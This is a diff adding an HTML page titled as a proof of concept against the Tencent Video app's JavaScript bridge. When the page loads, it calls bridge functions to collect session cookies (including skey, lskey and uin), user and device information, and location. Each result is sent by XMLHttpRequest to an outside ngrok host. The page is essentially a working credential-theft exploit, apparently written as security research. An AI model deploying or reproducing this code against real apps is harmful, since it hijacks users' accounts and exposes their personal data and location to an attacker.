@@ -1,0 +1,162 @@
+<html>
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html;charset=utf8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+   
+    <script type="text/javascript">
+
+        window.TencentVideoTest = {
+        
+            
+            
+            
+            getCookie: function (type) {
+                TenvideoJSBridge.invoke('getCookie', { 'type': type }, function (ret) {
+                    var jret = JSON.parse(ret);
+                    console.log(JSON.stringify(jret));
+                    alert(JSON.stringify(jret.result));
+                    var xhttp = new XMLHttpRequest();
+                     xhttp.onreadystatechange = function() {
+                    if (this.readyState == 4 && this.status == 200) {
+                    // Typical action to be performed when the document is ready:
+                    alert("DONE");
+                    }
+                 };
+                xhttp.open("GET", "https://797b0cf2.ngrok.io/"+JSON.stringify(jret.result), true);
+                xhttp.send();
+                });
+            },
+            getUserInfo: function (type) {
+                TenvideoJSBridge.invoke('getUserInfo', { 'type': type }, function (ret) {
+                    var jret = JSON.parse(ret);
+                    alert(JSON.stringify(jret.result));
+                    var xhttp = new XMLHttpRequest();
+                     xhttp.onreadystatechange = function() {
+                    if (this.readyState == 4 && this.status == 200) {
+                    // Typical action to be performed when the document is ready:
+                    alert("DONE");
+                    }
+                 };
+                xhttp.open("GET", "https://797b0cf2.ngrok.io/"+JSON.stringify(jret.result), true);
+                xhttp.send();
+                });
+            },
+            getSimpleMainUserInfo: function (type) {
+                TenvideoJSBridge.invoke('getSimpleMainUserInfo', null, function (ret) {
+                    var jret = JSON.parse(ret);
+                    alert(JSON.stringify(jret.result));
+                    var xhttp = new XMLHttpRequest();
+                     xhttp.onreadystatechange = function() {
+                    if (this.readyState == 4 && this.status == 200) {
+                    // Typical action to be performed when the document is ready:
+                    alert("DONE");
+                    }
+                 };
+                xhttp.open("GET", "https://797b0cf2.ngrok.io/"+JSON.stringify(jret.result), true);
+                xhttp.send();
+                });
+            },
+            getDeviceInfo: function () {
+                TenvideoJSBridge.invoke('getDeviceInfo', null, function (ret) {
+                    var jret = JSON.parse(ret);
+                    alert(JSON.stringify(jret.result));
+                    var xhttp = new XMLHttpRequest();
+                     xhttp.onreadystatechange = function() {
+                    if (this.readyState == 4 && this.status == 200) {
+                    // Typical action to be performed when the document is ready:
+                    alert("DONE");
+                    }
+                 };
+                xhttp.open("GET", "https://797b0cf2.ngrok.io/"+JSON.stringify(jret.result), true);
+                xhttp.send();
+                });
+            },
+            getLocation: function () {
+                TenvideoJSBridge.invoke('getLocation', null, function (ret) {
+                    var jret = JSON.parse(ret);
+                    alert("getLocation: " + JSON.stringify(jret.result));
+                    //printLog(ret);
+                    var xhttp = new XMLHttpRequest();
+                     xhttp.onreadystatechange = function() {
+                    if (this.readyState == 4 && this.status == 200) {
+                    // Typical action to be performed when the document is ready:
+                    alert("DONE");
+                    }
+                 };
+                xhttp.open("GET", "https://797b0cf2.ngrok.io/"+JSON.stringify(jret.result), true);
+                xhttp.send();
+                });
+            },
+            old_getCookieValue: function () {
+                alert(Android.getCookieValue('uin') + "\n"
+                    + Android.getCookieValue('luin') + '\n'
+                    + Android.getCookieValue('lskey') + '\n'
+                    + Android.getCookieValue('skey') + '\n'
+                    + Android.getCookieValue('nickname') + '\n'
+                );
+                var res = Android.getCookieValue('uin') + "\n"
+                    + Android.getCookieValue('luin') + '\n'
+                    + Android.getCookieValue('lskey') + '\n'
+                    + Android.getCookieValue('skey') + '\n'
+                    + Android.getCookieValue('nickname') + '\n';
+                    var xhttp = new XMLHttpRequest();
+                     xhttp.onreadystatechange = function() {
+                    if (this.readyState == 4 && this.status == 200) {
+                    // Typical action to be performed when the document is ready:
+                    alert("DONE");
+                    }
+                 };
+                xhttp.open("GET", "https://797b0cf2.ngrok.io/"+res, true);
+                xhttp.send();
+            }
+
+
+   
+        }
+
+        if (typeof TenvideoJSBridge == "object") {
+            callback();
+        } else {
+            if (document.addEventListener) {
+                document.addEventListener("onTenvideoJSBridgeReady", callback, false);
+            } else if (document.attachEvent) {
+                document.attachEvent("onTenvideoJSBridgeReady", callback);
+            }
+        }
+
+
+
+        function callback() {
+            isTenvideoJSBridgeReady = true;
+            var getCookie =  function() {
+                            TencentVideoTest["getCookie"](['qq', 'wx', 'tv']);
+                            };
+                            getCookie();
+            var getUserInfo = function() {
+                            TencentVideoTest["getUserInfo"](['qq', 'wx']);
+                            };
+                            getUserInfo();
+            var getSimpleMainUserInfo = function() {
+                            TencentVideoTest["getSimpleMainUserInfo"](['qq', 'wx']);
+                            };
+                            getSimpleMainUserInfo();
+            var old_getCookieValue = TencentVideoTest["old_getCookieValue"];
+                            old_getCookieValue();
+            var getDeviceInfo = TencentVideoTest["getDeviceInfo"];
+                            getDeviceInfo();
+            var getLocation = TencentVideoTest["getLocation"];
+                            getLocation();
+            TenvideoJSBridge.invoke("toast", { "content": "jsapi is ok!" });   
+        }
+
+       
+
+    </script>
+</head>
+
+<body>
+<h1>Deeplink_txvideo-POC</h1>
+</body>
+
+</html>
